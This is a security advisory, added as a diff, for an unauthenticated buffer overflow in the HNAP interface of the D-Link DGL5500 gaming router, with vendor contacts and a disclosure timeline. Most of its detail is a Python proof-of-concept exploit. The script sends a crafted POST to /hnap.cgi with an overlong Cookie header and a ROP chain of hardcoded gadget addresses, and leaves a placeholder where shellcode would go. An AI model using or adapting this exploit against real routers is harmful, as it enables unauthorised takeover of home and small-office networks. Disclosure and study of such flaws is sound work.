@@ -1,0 +1,65 @@
+## Advisory Information
+
+Title: DGL5500 Un-Authenticated Buffer overflow in HNAP functionality 
+Vendors contacted: William Brown <william.brown@dlink.com>, Patrick Cline patrick.cline@dlink.com(Dlink)
+CVE: None
+
+Note: All these security issues have been discussed with the vendor and vendor indicated that they have fixed issues as per the email communication. The vendor had also released the information on their security advisory pages http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10060, 
+http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10061
+
+However, the vendor has taken now the security advisory pages down and hence the information needs to be publicly accessible so that users using these devices can update the router firmwares. The author (Samuel Huntley) releasing this finding is not responsible for anyone using this information for malicious purposes.
+
+## Product Description
+
+DGL5500 -- Gaming Router AC1300 with StreamBoost. Mainly used by home and small offices.
+
+## Vulnerabilities Summary
+
+Have come across 1 security issue in DGL5500 firmware which allows an attacker on wireless LAN  to exploit buffer overflow vulnerabilitiy in hnap functionality. Does not require any authentication and can be exploited on WAN if the management interface is exposed.
+
+## Details
+
+# HNAP buffer oberflow
+----------------------------------------------------------------------------------------------------------------------
+import socket
+import struct
+import string
+import sys
+
+BUFFER_SIZE = 2048
+
+# Although you can access this URL unauthenticated on WAN connection which is great but need a good shellcode. buffer overflow in check_hnap_auth
+
+buf = "POST /hnap.cgi HTTP/1.1\r\nHOST: 10.0.0.90\r\nUser-Agent: test\r\nContent-Length: 13\r\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings\r\nHNAP_AUTH: test\r\nCookie: unsupportedbrowser=1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
+buf+="FFFF"
+buf+="AAAA" #s0
+buf+="\x2A\xBF\xB9\xF4" #s1 ROP 2
+buf+="\x2A\xC1\x3C\x30" #s2 sleep address
+buf+="DDDD" #s3
+buf+="\x2A\xC0\xEB\x50" #s4 ROP 4 2AC0EB50
+buf+="\x2a\xc0\xf3\xe8" # Retn address 2AC0F3E8 ROP1  
+buf+="XXXXFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGG" # 36 bytes of gap
+buf+="\x2A\xBC\xDB\xD0" #  ROP 3
+buf+="GGGGGGGGGGGGGGGG"
+buf+="AAAAAAAAAAAAAAAAAAAAA" # Needs a proper shell code Bad chars 1,0 in the first bit of hex byte so 1x or 0x
+buf+="GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ\r\n\r\n"+"test=test\r\n\r\n"
+ 
+print "[+] sending buffer size", len(buf)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((sys.argv[1], 80))
+s.send(buf)
+data = s.recv(BUFFER_SIZE)
+s.close()
+print "received data:", data
+
+----------------------------------------------------------------------------------------------------------------------
+
+## Report Timeline
+
+* April 26, 2015: Vulnerability found by Samuel Huntley and reported to William Brown and Patrick Cline.
+* July 17, 2015: Vulnerability was fixed by Dlink as per the email sent by the vendor
+* Nov 13, 2015: A public advisory is sent to security mailing lists.
+
+## Credit
+
+This vulnerability was found by Samuel Huntley
